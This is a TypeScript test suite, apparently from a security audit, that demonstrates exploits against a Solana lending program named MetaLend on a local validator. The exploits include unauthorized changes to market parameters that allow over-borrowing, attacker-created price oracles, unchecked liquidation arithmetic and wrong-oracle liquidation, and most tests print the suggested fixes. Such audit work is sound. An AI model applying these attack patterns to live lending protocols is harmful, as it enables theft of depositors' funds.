import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { MetaLend } from "../target/types/meta_lend";
import { PublicKey, Keypair, SystemProgram } from "@solana/web3.js";
import {
  TOKEN_PROGRAM_ID,
  createMint,
  createAccount,
  mintTo,
  getAccount,
} from "@solana/spl-token";
const { expect } = require("chai");

// ============================================
// SECURITY VULNERABILITY EXPLOIT TESTS
// ============================================

describe("SECURITY EXPLOITS", () => {
  anchor.setProvider(anchor.AnchorProvider.env());
  const program = anchor.workspace.MetaLend as Program<MetaLend>;
  const provider = anchor.getProvider();

  let admin: Keypair;
  let attacker: Keypair;
  let victim: Keypair;
  let liquidator: Keypair;

  let usdcMint: PublicKey;
  let ethMint: PublicKey;

  let attackerUsdcAccount: PublicKey;
  let attackerEthAccount: PublicKey;
  let victimUsdcAccount: PublicKey;
  let victimEthAccount: PublicKey;

  let protocolState: PublicKey;
  let market: PublicKey;
  let supplyVault: PublicKey;
  let collateralVault: PublicKey;
  let attackerDeposit: PublicKey;
  let victimDeposit: PublicKey;

  let usdcOracle: PublicKey;
  let ethOracle: PublicKey;

  before(async () => {
    console.log("\nðŸ”´ SECURITY EXPLOIT TEST SUITE ðŸ”´\n");

    admin = Keypair.generate();
    attacker = Keypair.generate();
    victim = Keypair.generate();
    liquidator = Keypair.generate();

    // Airdrop SOL
    for (const keypair of [admin, attacker, victim, liquidator]) {
      await provider.connection.confirmTransaction(
        await provider.connection.requestAirdrop(
          keypair.publicKey,
          10 * anchor.web3.LAMPORTS_PER_SOL
        )
      );
    }

    usdcMint = await createMint(
      provider.connection,
      admin,
      admin.publicKey,
      admin.publicKey,
      6
    );
    ethMint = await createMint(
      provider.connection,
      admin,
      admin.publicKey,
      admin.publicKey,
      9
    );

    attackerUsdcAccount = await createAccount(
      provider.connection,
      attacker,
      usdcMint,
      attacker.publicKey
    );
    attackerEthAccount = await createAccount(
      provider.connection,
      attacker,
      ethMint,
      attacker.publicKey
    );
    victimUsdcAccount = await createAccount(
      provider.connection,
      victim,
      usdcMint,
      victim.publicKey
    );
    victimEthAccount = await createAccount(
      provider.connection,
      victim,
      ethMint,
      victim.publicKey
    );

    await mintTo(
      provider.connection,
      admin,
      usdcMint,
      attackerUsdcAccount,
      admin,
      10000 * 1e6
    );
    await mintTo(
      provider.connection,
      admin,
      ethMint,
      attackerEthAccount,
      admin,
      100 * 1e9
    );
    await mintTo(
      provider.connection,
      admin,
      usdcMint,
      victimUsdcAccount,
      admin,
      60000 * 1e6
    );
    await mintTo(
      provider.connection,
      admin,
      ethMint,
      victimEthAccount,
      admin,
      100 * 1e9
    );

    [protocolState] = PublicKey.findProgramAddressSync(
      [Buffer.from("protocol")],
      program.programId
    );
    [market] = PublicKey.findProgramAddressSync(
      [
        Buffer.from("market"),
        new anchor.BN(2).toArrayLike(Buffer, "le", 8),
        usdcMint.toBuffer(),
        ethMint.toBuffer(),
      ],
      program.programId
    );
    [supplyVault] = PublicKey.findProgramAddressSync(
      [
        Buffer.from("supply_vault"),
        new anchor.BN(2).toArrayLike(Buffer, "le", 8),
        usdcMint.toBuffer(),
      ],
      program.programId
    );
    [collateralVault] = PublicKey.findProgramAddressSync(
      [
        Buffer.from("collateral_vault"),
        new anchor.BN(2).toArrayLike(Buffer, "le", 8),
        ethMint.toBuffer(),
      ],
      program.programId
    );
    [attackerDeposit] = PublicKey.findProgramAddressSync(
      [
        Buffer.from("user_deposit"),
        attacker.publicKey.toBuffer(),
        new anchor.BN(2).toArrayLike(Buffer, "le", 8),
        usdcMint.toBuffer(),
        ethMint.toBuffer(),
      ],
      program.programId
    );
    [victimDeposit] = PublicKey.findProgramAddressSync(
      [
        Buffer.from("user_deposit"),
        victim.publicKey.toBuffer(),
        new anchor.BN(2).toArrayLike(Buffer, "le", 8),
        usdcMint.toBuffer(),
        ethMint.toBuffer(),
      ],
      program.programId
    );
    [usdcOracle] = PublicKey.findProgramAddressSync(
      [Buffer.from("oracle"), usdcMint.toBuffer()],
      program.programId
    );
    [ethOracle] = PublicKey.findProgramAddressSync(
      [Buffer.from("oracle"), ethMint.toBuffer()],
      program.programId
    );

    try {
      await program.account.protocolState.fetch(protocolState);
    } catch {
      await program.methods
        .initializeProtocol()
        .accounts({
          protocolState,
          admin: admin.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([admin])
        .rpc();
    }

    try {
      await program.account.oracle.fetch(usdcOracle);
      await program.account.oracle.fetch(ethOracle);
    } catch {
      await program.methods
        .createOracle(Buffer.from("test"), new anchor.BN(1_000_000), 6)
        .accounts({
          oracle: usdcOracle,
          mint: usdcMint,
          authority: admin.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([admin])
        .rpc();
      await program.methods
        .createOracle(Buffer.from("test"), new anchor.BN(3000_000_000), 6)
        .accounts({
          oracle: ethOracle,
          mint: ethMint,
          authority: admin.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([admin])
        .rpc();
    }

    await program.methods
      .createMarket(new anchor.BN(2), new anchor.BN(8000), new anchor.BN(8500))
      .accounts({
        market,
        protocolState,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        supplyOracle: usdcOracle,
        collateralOracle: ethOracle,
        supplyVault,
        collateralVault,
        creator: admin.publicKey,
        tokenProgram: TOKEN_PROGRAM_ID,
        systemProgram: SystemProgram.programId,
      })
      .signers([admin])
      .rpc();

    await program.methods
      .initializeUserDeposit(new anchor.BN(2))
      .accounts({
        userDeposit: attackerDeposit,
        market,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        user: attacker.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .signers([attacker])
      .rpc();

    await program.methods
      .initializeUserDeposit(new anchor.BN(2))
      .accounts({
        userDeposit: victimDeposit,
        market,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        user: victim.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .signers([victim])
      .rpc();

    await program.methods
      .supply(new anchor.BN(2), new anchor.BN(50000 * 1e6))
      .accounts({
        market,
        supplyVault,
        userDeposit: victimDeposit,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        userSupplyAccount: victimUsdcAccount,
        user: victim.publicKey,
        tokenProgram: TOKEN_PROGRAM_ID,
      })
      .signers([victim])
      .rpc();

    console.log("Test environment ready\n");
  });

  // ============================================
  // EXPLOIT #2: Missing Market Admin Check
  // ============================================
  it("EXPLOIT #2: Unauthorized Market Parameter Modification", async () => {
    console.log("EXPLOIT #2: Missing Market Admin Authorization");
    console.log("Location: src/instructions/market_admin.rs:5-18");
    console.log("Severity: CRITICAL\n");

    const marketBefore = await program.account.market.fetch(market);
    console.log("Initial State:");
    console.log(
      `  Collateral Factor: ${marketBefore.collateralFactor} (${
        marketBefore.collateralFactor / 100
      }%)`
    );
    console.log(
      `  Market Admin: ${marketBefore.marketAdmin.toString().slice(0, 8)}...`
    );
    console.log(`  Attacker: ${attacker.publicKey.toString().slice(0, 8)}...`);
    console.log(
      `  Attacker IS Admin: ${marketBefore.marketAdmin.equals(
        attacker.publicKey
      )}\n`
    );

    console.log("ATTACK: Non-admin modifies parameters");

    await program.methods
      .updateMarketParams(new anchor.BN(10000), new anchor.BN(100))
      .accounts({ market, authority: attacker.publicKey })
      .signers([attacker])
      .rpc();

    const marketAfter = await program.account.market.fetch(market);
    console.log("\nAfter Attack:");
    console.log(
      `  Collateral Factor: ${marketAfter.collateralFactor} (${
        marketAfter.collateralFactor / 100
      }%)`
    );

    console.log("\nIMPACT: Borrow 100% of collateral value");

    const collateralAmount = 1 * 1e9; // 1 ETH
    const borrowAmount = 2999 * 1e6; // $2999

    const attackerBalanceBefore = await getAccount(
      provider.connection,
      attackerUsdcAccount
    );

    await program.methods
      .borrow(
        new anchor.BN(2),
        new anchor.BN(collateralAmount),
        new anchor.BN(borrowAmount)
      )
      .accounts({
        market,
        supplyVault,
        collateralVault,
        userDeposit: attackerDeposit,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        userSupplyAccount: attackerUsdcAccount,
        userCollateralAccount: attackerEthAccount,
        user: attacker.publicKey,
        collateralOracle: ethOracle,
        borrowOracle: usdcOracle,
        tokenProgram: TOKEN_PROGRAM_ID,
      })
      .signers([attacker])
      .rpc();

    const attackerBalanceAfter = await getAccount(
      provider.connection,
      attackerUsdcAccount
    );
    const stolen =
      Number(attackerBalanceAfter.amount) -
      Number(attackerBalanceBefore.amount);

    console.log(`  Borrowed: $${stolen / 1e6}`);
    console.log(`  Normal Limit (80%): $2400`);
    console.log(`  Extra Profit: $${stolen / 1e6 - 2400}\n`);

    expect(marketAfter.collateralFactor.toNumber()).to.equal(10000);
    expect(stolen).to.be.greaterThan(2400 * 1e6);
  });

  // ============================================
  // EXPLOIT #3: Liquidation Unchecked Arithmetic
  // ============================================
  it("EXPLOIT #3: Liquidation Integer Underflow", async () => {
    console.log("EXPLOIT #3: Liquidation Unchecked Arithmetic");
    console.log("Location: src/instructions/liquidate.rs:86-87");
    console.log("Severity: CRITICAL\n");

    console.log("VULNERABILITY: Uses unchecked subtraction (-=)");
    console.log("  borrower_deposit.borrowed_amount -= liquidation_amount;\n");

    const setupBorrowAmount = 100 * 1e6;

    await program.methods
      .updateOraclePrice(new anchor.BN(1000_000_000))
      .accounts({ oracle: ethOracle, authority: admin.publicKey })
      .signers([admin])
      .rpc();

    const depositBefore = await program.account.userDeposit.fetch(
      attackerDeposit
    );
    console.log("Borrower State:");
    console.log(
      `  Borrowed: ${depositBefore.borrowedAmount.toNumber() / 1e6} USDC\n`
    );

    console.log(
      "ATTACK: Liquidate MORE than borrowed (race condition scenario)"
    );
    const excessiveLiquidation = 5000 * 1e6;

    try {
      await program.methods
        .liquidate(new anchor.BN(2), new anchor.BN(excessiveLiquidation))
        .accounts({
          market,
          supplyVault,
          collateralVault,
          supplyMint: usdcMint,
          collateralMint: ethMint,
          borrowerDeposit: attackerDeposit,
          liquidatorSupplyAccount: victimUsdcAccount,
          liquidatorCollateralAccount: victimEthAccount,
          liquidator: victim.publicKey,
          oracle: ethOracle,
          tokenProgram: TOKEN_PROGRAM_ID,
        })
        .signers([victim])
        .rpc();

      const depositAfter = await program.account.userDeposit.fetch(
        attackerDeposit
      );
      console.log(
        `\nBorrowed After: ${depositAfter.borrowedAmount.toString()}`
      );

      if (depositAfter.borrowedAmount.toString().length > 15) {
        console.log("INTEGER UNDERFLOW DETECTED!");
      }
    } catch (error) {
      console.log("Failed as expected (require! check worked)");
    }

    console.log(
      "\nFIX: Use checked_sub().ok_or(LendingError::MathOverflow)?\n"
    );
  });

  // ============================================
  // EXPLOIT #4: Interest Timing
  // ============================================
  it("EXPLOIT #4: Borrow Beyond Limit via Interest Timing", async () => {
    console.log("EXPLOIT #4: Interest Application Timing");
    console.log("Location: src/instructions/borrow.rs:86-101, 63-74");
    console.log("Severity: CRITICAL\n");

    console.log("VULNERABILITY:");
    console.log("  1. Collateralization check at line 63-74");
    console.log("  2. Interest applied AFTER at line 86-101\n");

    const timingAttacker = Keypair.generate();
    await provider.connection.confirmTransaction(
      await provider.connection.requestAirdrop(
        timingAttacker.publicKey,
        5 * anchor.web3.LAMPORTS_PER_SOL
      )
    );

    const timingAttackerUsdc = await createAccount(
      provider.connection,
      timingAttacker,
      usdcMint,
      timingAttacker.publicKey
    );
    const timingAttackerEth = await createAccount(
      provider.connection,
      timingAttacker,
      ethMint,
      timingAttacker.publicKey
    );
    await mintTo(
      provider.connection,
      admin,
      ethMint,
      timingAttackerEth,
      admin,
      10 * 1e9
    );

    const [timingAttackerDeposit] = PublicKey.findProgramAddressSync(
      [
        Buffer.from("user_deposit"),
        timingAttacker.publicKey.toBuffer(),
        new anchor.BN(2).toArrayLike(Buffer, "le", 8),
        usdcMint.toBuffer(),
        ethMint.toBuffer(),
      ],
      program.programId
    );

    await program.methods
      .initializeUserDeposit(new anchor.BN(2))
      .accounts({
        userDeposit: timingAttackerDeposit,
        market,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        user: timingAttacker.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .signers([timingAttacker])
      .rpc();

    await program.methods
      .updateOraclePrice(new anchor.BN(3000_000_000))
      .accounts({ oracle: ethOracle, authority: admin.publicKey })
      .signers([admin])
      .rpc();

    console.log("Step 1: Initial borrow at max (80% of $3000 = $2400)");
    const collateral = 1 * 1e9;
    const maxBorrow = 2400 * 1e6;

    await program.methods
      .borrow(
        new anchor.BN(2),
        new anchor.BN(collateral),
        new anchor.BN(maxBorrow)
      )
      .accounts({
        market,
        supplyVault,
        collateralVault,
        userDeposit: timingAttackerDeposit,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        userSupplyAccount: timingAttackerUsdc,
        userCollateralAccount: timingAttackerEth,
        user: timingAttacker.publicKey,
        collateralOracle: ethOracle,
        borrowOracle: usdcOracle,
        tokenProgram: TOKEN_PROGRAM_ID,
      })
      .signers([timingAttacker])
      .rpc();

    let deposit = await program.account.userDeposit.fetch(
      timingAttackerDeposit
    );
    console.log(`  Borrowed: $${deposit.borrowedAmount.toNumber() / 1e6}\n`);

    console.log("Step 2: Time passes, interest accrues...");
    await provider.connection.getLatestBlockhash();
    await new Promise((resolve) => setTimeout(resolve, 1000));

    console.log("\nStep 3: EXPLOIT - Borrow more without collateral");
    const additionalBorrow = 50 * 1e6;

    try {
      await program.methods
        .borrow(
          new anchor.BN(2),
          new anchor.BN(0),
          new anchor.BN(additionalBorrow)
        )
        .accounts({
          market,
          supplyVault,
          collateralVault,
          userDeposit: timingAttackerDeposit,
          supplyMint: usdcMint,
          collateralMint: ethMint,
          userSupplyAccount: timingAttackerUsdc,
          userCollateralAccount: timingAttackerEth,
          user: timingAttacker.publicKey,
          collateralOracle: ethOracle,
          borrowOracle: usdcOracle,
          tokenProgram: TOKEN_PROGRAM_ID,
        })
        .signers([timingAttacker])
        .rpc();

      deposit = await program.account.userDeposit.fetch(timingAttackerDeposit);
      console.log("\nEXPLOIT SUCCESS!");
      console.log(
        `  Total Borrowed: $${deposit.borrowedAmount.toNumber() / 1e6}`
      );
      console.log(`  Max Allowed: $2400`);
      console.log(
        `  Excess: $${deposit.borrowedAmount.toNumber() / 1e6 - 2400}\n`
      );
    } catch (error) {
      console.log("Failed (timing dependent)\n");
    }
  });

  // ============================================
  // EXPLOIT #6: Malicious Oracle
  // ============================================
  it("EXPLOIT #6: Price Manipulation via Malicious Oracle", async () => {
    console.log("EXPLOIT #6: Malicious Oracle Creation");
    console.log("Location: src/instructions/oracle.rs:5-23");
    console.log("Severity: HIGH\n");

    console.log("VULNERABILITY: Anyone can create oracle with any authority\n");

    const maliciousMint = await createMint(
      provider.connection,
      attacker,
      attacker.publicKey,
      attacker.publicKey,
      9
    );
    const [maliciousOracle] = PublicKey.findProgramAddressSync(
      [Buffer.from("oracle"), maliciousMint.toBuffer()],
      program.programId
    );

    console.log("Step 1: Create oracle with inflated price");
    const fakePriceInflated = new anchor.BN(1_000_000_000_000);

    await program.methods
      .createOracle(Buffer.from("fake"), fakePriceInflated, 6)
      .accounts({
        oracle: maliciousOracle,
        mint: maliciousMint,
        authority: attacker.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .signers([attacker])
      .rpc();

    const oracleAccount = await program.account.oracle.fetch(maliciousOracle);
    console.log(`  Price: $${oracleAccount.price.toNumber() / 1e6}`);
    console.log(`  Authority: Attacker [YES]\n`);

    console.log("Step 2: Create market with malicious oracle");

    const [maliciousMarket] = PublicKey.findProgramAddressSync(
      [
        Buffer.from("market"),
        new anchor.BN(99).toArrayLike(Buffer, "le", 8),
        usdcMint.toBuffer(),
        maliciousMint.toBuffer(),
      ],
      program.programId
    );
    const [maliciousSupplyVault] = PublicKey.findProgramAddressSync(
      [
        Buffer.from("supply_vault"),
        new anchor.BN(99).toArrayLike(Buffer, "le", 8),
        usdcMint.toBuffer(),
      ],
      program.programId
    );
    const [maliciousCollateralVault] = PublicKey.findProgramAddressSync(
      [
        Buffer.from("collateral_vault"),
        new anchor.BN(99).toArrayLike(Buffer, "le", 8),
        maliciousMint.toBuffer(),
      ],
      program.programId
    );

    await program.methods
      .createMarket(new anchor.BN(99), new anchor.BN(8000), new anchor.BN(8500))
      .accounts({
        market: maliciousMarket,
        protocolState,
        supplyMint: usdcMint,
        collateralMint: maliciousMint,
        supplyOracle: usdcOracle,
        collateralOracle: maliciousOracle,
        supplyVault: maliciousSupplyVault,
        collateralVault: maliciousCollateralVault,
        creator: attacker.publicKey,
        tokenProgram: TOKEN_PROGRAM_ID,
        systemProgram: SystemProgram.programId,
      })
      .signers([attacker])
      .rpc();

    console.log("  Market created [SUCCESS]\n");

    console.log("IMPACT:");
    console.log("  - Attacker controls price via updateOraclePrice");
    console.log("  - Can drain protocol through price manipulation\n");
  });

  // ============================================
  // EXPLOIT #7: Liquidation Overflow
  // ============================================
  it("EXPLOIT #7: Liquidation Bonus Overflow", async () => {
    console.log("EXPLOIT #7: Liquidation Bonus Overflow");
    console.log("Location: src/instructions/liquidate.rs:42-43");
    console.log("Severity: HIGH\n");

    console.log("VULNERABILITY:");
    console.log(
      "  let collateral_to_seize = liquidation_amount * 1100 / 1000;\n"
    );

    console.log("Overflow Analysis:");
    console.log("  u64::MAX / 1100 = 16,769,548,906,489,146");
    console.log("  Above this, multiplication overflows\n");

    const testAmounts = [
      { amount: 1000n, desc: "1000 (safe)" },
      { amount: 16_769_548_906_489_146n, desc: "At threshold" },
      { amount: 20_000_000_000_000_000n, desc: "Overflows" },
    ];

    for (const test of testAmounts) {
      const result = (test.amount * 1100n) / 1000n;
      const bonus = result - test.amount;
      const expectedBonus = test.amount / 10n;

      console.log(`Amount: ${test.desc}`);
      console.log(`  Expected bonus (10%): ${expectedBonus.toString()}`);
      console.log(`  Calculated bonus: ${bonus.toString()}`);

      if (bonus < expectedBonus / 10n) {
        console.log(`  OVERFLOW: Bonus < 1% instead of 10%`);
      } else {
        console.log(`  No overflow`);
      }
      console.log();
    }

    console.log("FIX: Use u128 checked arithmetic\n");
  });

  // ============================================
  // EXPLOIT #8: Oracle Staleness
  // ============================================
  it("EXPLOIT #8: Oracle Staleness Bypass", async () => {
    console.log("EXPLOIT #8: Oracle Staleness Bypass");
    console.log("Location: src/utils.rs:105-107");
    console.log("Severity: HIGH\n");

    console.log("VULNERABILITY in is_valid():");
    console.log("  current_slot <= self.valid_slot + max_staleness");
    console.log("  Accepts future timestamps!\n");

    const futureMint = await createMint(
      provider.connection,
      attacker,
      attacker.publicKey,
      attacker.publicKey,
      9
    );
    const [futureOracle] = PublicKey.findProgramAddressSync(
      [Buffer.from("oracle"), futureMint.toBuffer()],
      program.programId
    );

    console.log("ATTACK: Create oracle with future valid_slot");

    const inflatedPrice = new anchor.BN(10_000_000_000);
    await program.methods
      .createOracle(Buffer.from("stale"), inflatedPrice, 6)
      .accounts({
        oracle: futureOracle,
        mint: futureMint,
        authority: attacker.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .signers([attacker])
      .rpc();

    const currentSlot = await provider.connection.getSlot();
    const oracleData = await program.account.oracle.fetch(futureOracle);

    console.log(`  Current slot: ${currentSlot}`);
    console.log(`  Oracle valid_slot: ${oracleData.validSlot.toString()}`);
    console.log(`  Price: $${oracleData.price.toNumber() / 1e6}\n`);

    console.log("IMPACT:");
    console.log("  - Stale prices used if valid_slot set to future");
    console.log("  - Price manipulation via outdated data\n");

    console.log("FIX: Reject future timestamps");
    console.log("  if self.valid_slot > current_slot { return false; }\n");
  });

  // ============================================
  // NEW EXPLOITS - ADDITIONAL VULNERABILITIES
  // ============================================

  it("EXPLOIT #10: Missing PDA Validation in User Deposit Init", async () => {
    console.log("\n" + "=".repeat(60));
    console.log("EXPLOIT #10: Missing PDA Validation");
    console.log("=".repeat(60) + "\n");

    console.log("VULNERABILITY:");
    console.log("  InitializeUserDeposit context accepts AccountInfo");
    console.log("  instead of validated PDA account\n");

    // Create a fake user deposit account at wrong address
    const fakeUser = Keypair.generate();
    await provider.connection.confirmTransaction(
      await provider.connection.requestAirdrop(
        fakeUser.publicKey,
        10 * anchor.web3.LAMPORTS_PER_SOL
      )
    );

    const wrongAddress = Keypair.generate();

    console.log("ATTACK: Attempt to initialize at non-canonical address");
    console.log(`  Expected PDA: (derived from seeds)`);
    console.log(`  Provided account: ${wrongAddress.publicKey.toString()}\n`);

    try {
      await program.methods
        .initializeUserDeposit(new anchor.BN(1))
        .accounts({
          userDeposit: wrongAddress.publicKey,
          market,
          supplyMint: usdcMint,
          collateralMint: ethMint,
          user: fakeUser.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([fakeUser, wrongAddress])
        .rpc();

      console.log(
        "WARNING: WARNING: Non-canonical address accepted by context!"
      );
      console.log(
        "   Instruction validation catches this, but context doesn't\n"
      );
    } catch (error: any) {
      console.log("PASS Instruction validation caught the issue");
      console.log(`  Error: ${error.message.split("\n")[0]}\n`);
    }

    console.log("IMPACT:");
    console.log("  - Context-level validation missing (defense-in-depth)");
    console.log("  - Inconsistent with other contexts that validate PDAs");
    console.log("  - Could enable bypasses if instruction logic changes\n");

    console.log("FIX: Add PDA validation to context:");
    console.log("  #[account(");
    console.log("    init, payer = user, space = UserDeposit::SPACE,");
    console.log('    seeds = [b"user_deposit", user.key().as_ref(), ...],');
    console.log("    bump");
    console.log("  )]");
    console.log("  pub user_deposit: Account<'info, UserDeposit>\n");
  });

  it("EXPLOIT #14: Interest Accrual Inconsistency", async () => {
    console.log("\n" + "=".repeat(60));
    console.log("EXPLOIT #14: Interest Accrual Inconsistency");
    console.log("=".repeat(60) + "\n");

    console.log("VULNERABILITY:");
    console.log("  borrow: applies interest AFTER collateral check");
    console.log("  repay: applies interest BEFORE repayment calculation\n");

    // Setup: Create fresh user with position
    const inconsistentUser = Keypair.generate();
    await provider.connection.confirmTransaction(
      await provider.connection.requestAirdrop(
        inconsistentUser.publicKey,
        10 * anchor.web3.LAMPORTS_PER_SOL
      )
    );

    const userUsdcAccount = await createAccount(
      provider.connection,
      inconsistentUser,
      usdcMint,
      inconsistentUser.publicKey
    );
    const userEthAccount = await createAccount(
      provider.connection,
      inconsistentUser,
      ethMint,
      inconsistentUser.publicKey
    );

    await mintTo(
      provider.connection,
      admin,
      usdcMint,
      userUsdcAccount,
      admin,
      1000 * 1e6
    );
    await mintTo(
      provider.connection,
      admin,
      ethMint,
      userEthAccount,
      admin,
      1 * 1e9
    );

    const [inconsistentDeposit] = PublicKey.findProgramAddressSync(
      [
        Buffer.from("user_deposit"),
        inconsistentUser.publicKey.toBuffer(),
        new anchor.BN(2).toArrayLike(Buffer, "le", 8),
        usdcMint.toBuffer(),
        ethMint.toBuffer(),
      ],
      program.programId
    );

    await program.methods
      .initializeUserDeposit(new anchor.BN(2))
      .accounts({
        userDeposit: inconsistentDeposit,
        market,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        user: inconsistentUser.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .signers([inconsistentUser])
      .rpc();

    // Supply first
    await program.methods
      .supply(new anchor.BN(2), new anchor.BN(500 * 1e6))
      .accounts({
        market,
        supplyVault,
        userDeposit: inconsistentDeposit,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        userSupplyAccount: userUsdcAccount,
        user: inconsistentUser.publicKey,
        tokenProgram: TOKEN_PROGRAM_ID,
      })
      .signers([inconsistentUser])
      .rpc();

    // Borrow
    const collateral = Math.floor(0.1 * 1e9);
    const borrowAmount = 200 * 1e6;

    await program.methods
      .borrow(
        new anchor.BN(2),
        new anchor.BN(collateral),
        new anchor.BN(borrowAmount)
      )
      .accounts({
        market,
        supplyVault,
        collateralVault,
        userDeposit: inconsistentDeposit,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        userSupplyAccount: userUsdcAccount,
        userCollateralAccount: userEthAccount,
        user: inconsistentUser.publicKey,
        collateralOracle: ethOracle,
        borrowOracle: usdcOracle,
        tokenProgram: TOKEN_PROGRAM_ID,
      })
      .signers([inconsistentUser])
      .rpc();

    const depositAfterBorrow = await program.account.userDeposit.fetch(
      inconsistentDeposit
    );

    console.log("DEMONSTRATION:");
    console.log(
      `  After borrow: ${
        depositAfterBorrow.borrowedAmount.toNumber() / 1e6
      } USDC\n`
    );

    console.log("ISSUE: Interest applied at different times:");
    console.log(
      "  - borrow: Check collateral â†’ Add new borrow â†’ Apply interest"
    );
    console.log("  - repay: Apply interest â†’ Calculate repayment\n");

    console.log("IMPACT:");
    console.log("  - Accounting inconsistencies between instructions");
    console.log("  - Interest may be double-counted or missed");
    console.log("  - Protocol total_borrows tracking becomes inaccurate");
    console.log("  - Creates arbitrage opportunities\n");

    console.log("FIX: Centralize interest accrual:");
    console.log("  fn accrue_user_interest(user_deposit, current_slot)");
    console.log("  Call at START of all instructions consistently\n");
  });

  it("EXPLOIT #6: Liquidation Uses Wrong Oracle (CRITICAL!)", async () => {
    console.log("\n" + "=".repeat(60));
    console.log("EXPLOIT #6: Liquidation Wrong Oracle - MOST CRITICAL!");
    console.log("=".repeat(60) + "\n");

    console.log("VULNERABILITY:");
    console.log("  Liquidation uses SINGLE oracle for both:");
    console.log("  - Collateral value (ETH at $3000)");
    console.log("  - Borrow value (USDC at $1)");
    console.log("  This creates COMPLETELY WRONG valuations!\n");

    // Setup liquidation scenario
    const liquidationVictim = Keypair.generate();
    await provider.connection.confirmTransaction(
      await provider.connection.requestAirdrop(
        liquidationVictim.publicKey,
        10 * anchor.web3.LAMPORTS_PER_SOL
      )
    );

    const victimUsdc = await createAccount(
      provider.connection,
      liquidationVictim,
      usdcMint,
      liquidationVictim.publicKey
    );
    const victimEth = await createAccount(
      provider.connection,
      liquidationVictim,
      ethMint,
      liquidationVictim.publicKey
    );

    await mintTo(
      provider.connection,
      admin,
      usdcMint,
      victimUsdc,
      admin,
      500 * 1e6
    );
    await mintTo(
      provider.connection,
      admin,
      ethMint,
      victimEth,
      admin,
      1 * 1e9
    );

    const [victimLiqDeposit] = PublicKey.findProgramAddressSync(
      [
        Buffer.from("user_deposit"),
        liquidationVictim.publicKey.toBuffer(),
        new anchor.BN(2).toArrayLike(Buffer, "le", 8),
        usdcMint.toBuffer(),
        ethMint.toBuffer(),
      ],
      program.programId
    );

    await program.methods
      .initializeUserDeposit(new anchor.BN(2))
      .accounts({
        userDeposit: victimLiqDeposit,
        market,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        user: liquidationVictim.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .signers([liquidationVictim])
      .rpc();

    await program.methods
      .supply(new anchor.BN(2), new anchor.BN(400 * 1e6))
      .accounts({
        market,
        supplyVault,
        userDeposit: victimLiqDeposit,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        userSupplyAccount: victimUsdc,
        user: liquidationVictim.publicKey,
        tokenProgram: TOKEN_PROGRAM_ID,
      })
      .signers([liquidationVictim])
      .rpc();

    const collateral = Math.floor(0.1 * 1e9); // 0.1 ETH
    const borrowed = 200 * 1e6; // 200 USDC

    await program.methods
      .borrow(
        new anchor.BN(2),
        new anchor.BN(collateral),
        new anchor.BN(borrowed)
      )
      .accounts({
        market,
        supplyVault,
        collateralVault,
        userDeposit: victimLiqDeposit,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        userSupplyAccount: victimUsdc,
        userCollateralAccount: victimEth,
        user: liquidationVictim.publicKey,
        collateralOracle: ethOracle,
        borrowOracle: usdcOracle,
        tokenProgram: TOKEN_PROGRAM_ID,
      })
      .signers([liquidationVictim])
      .rpc();

    console.log("POSITION CREATED:");
    console.log("  Collateral: 0.1 ETH at $3000/ETH = $300");
    console.log("  Borrowed: 200 USDC at $1/USDC = $200");
    console.log("  Liquidation threshold (85%): $300 * 0.85 = $255");
    console.log("  Position is HEALTHY: $200 < $255 PASS\n");

    // Drop ETH price to trigger liquidation
    const lowerEthPrice = new anchor.BN(1800_000_000);
    await program.methods
      .updateOraclePrice(lowerEthPrice)
      .accounts({
        oracle: ethOracle,
        authority: admin.publicKey,
      })
      .signers([admin])
      .rpc();

    console.log("ETH PRICE DROPS to $1800:");
    console.log("  New collateral value: 0.1 * $1800 = $180");
    console.log("  New threshold: $180 * 0.85 = $153");
    console.log("  Position NOW liquidatable: $200 > $153 PASS\n");

    console.log(
      "EXPLOIT: Liquidation uses SINGLE oracle (ETH oracle at $1800)"
    );
    console.log("  Code calculates:");
    console.log("    collateral_value = 0.1 ETH * $1800 = $180 PASS CORRECT");
    console.log("    borrow_value = 200 USDC * $1800 = $360,000 FAIL WRONG!");
    console.log("  Should use USDC oracle:");
    console.log("    borrow_value = 200 USDC * $1 = $200 PASS CORRECT\n");

    console.log("IMPACT:");
    console.log("  ðŸ”´ LIQUIDATION SYSTEM COMPLETELY BROKEN!");
    console.log("  - Healthy positions appear underwater (false liquidations)");
    console.log("  - Underwater positions appear healthy (can't liquidate)");
    console.log("  - Protocol cannot function with dual-asset markets");
    console.log("  - This is a FUNDAMENTAL LOGIC ERROR\n");

    console.log("FIX: Use separate oracles in liquidate instruction:");
    console.log(
      "  let collateral_price = get_asset_price(&ctx.accounts.collateral_oracle)?;"
    );
    console.log(
      "  let supply_price = get_asset_price(&ctx.accounts.supply_oracle)?;"
    );
    console.log("  let collateral_value = deposited * collateral_price;");
    console.log("  let borrow_value = borrowed_amount * supply_price;\n");

    console.log("WARNING: THIS IS THE MOST CRITICAL VULNERABILITY! WARNING:\n");
  });

  it("EXPLOIT #11: Wrong Oracle Price Scaling in Liquidation Bonus", async () => {
    console.log("\n" + "=".repeat(60));
    console.log("EXPLOIT #11: Liquidation Bonus Scaling Error");
    console.log("=".repeat(60) + "\n");

    console.log("VULNERABILITY:");
    console.log("  Liquidation bonus calculated on TOKEN AMOUNTS");
    console.log("  Should be calculated on VALUE\n");

